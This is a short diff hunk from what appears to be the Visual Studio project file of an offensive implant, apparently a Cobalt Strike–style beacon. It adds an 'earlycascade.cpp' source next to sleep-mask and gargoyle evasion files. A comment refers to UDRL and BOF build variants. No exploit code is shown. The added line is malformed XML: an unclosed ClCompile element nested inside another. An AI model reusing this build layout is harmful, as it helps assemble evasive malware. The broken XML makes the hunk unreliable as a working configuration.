@@ -56,6 +56,7 @@
     <ClCompile Include="src\gargleint.cpp" />
     <ClCompile Include="src\sleepmask_gen3.cpp" />
     <ClCompile Include="src\sleepmask_bofwin.cpp">
+      <ClCompile Include="src\earlycascade.cpp">
       <!-- Default TS-slot DLL must not carry the engine (~3.5KB, pe.process
            still needs the 5K wall so there is no slack). The UDRL/EXE
            variant (BeaconBofWin=true) compiles it into beacon.x64.rl0k.dll. -->
